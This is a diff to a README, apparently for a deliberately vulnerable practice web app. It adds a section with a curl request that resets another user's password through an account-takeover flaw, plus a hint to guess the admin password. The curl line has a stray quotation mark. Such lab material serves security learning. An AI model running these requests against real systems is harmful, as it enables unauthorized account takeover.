@@ -65,6 +65,16 @@ curl -X POST "https://tarkash.surapura.in/api/upload" \\
 ```
 - /uploads/yourfile.jpg
 
+### Try to change another user’s password (admin as well)
+Let’s say masino is user ID 8 :
+```bash
+curl -X POST "https://tarkash.surapura.in/api/change-password \
+  -H "Authorization: Bearer YOUR_JWT_TOKEN_HERE" \
+  -H "Content-Type: application/json" \
+  -d '{"user_id": 8, "new_password": "pwned-masino123"}'
+```
+- also you can try to guess admin's pass and login
+
 # Proxy with Burp ![](https://img.shields.io/badge/Burp--orange?logo=burpsuite&logoColor=orange)
 
 Intercept, inspect and replay API calls from **WSL** or **Kali** through **Burp Suite**.
@@ -139,6 +149,5 @@ nohup python3 app_formsubmit.py &
 
 #### will update more vulnerable routes - suggestions are welcome
 
-![image](https://github.com/user-attachments/assets/e6e98c16-6db0-4cbf-8823-e4e7fb35a2c5)
 
 
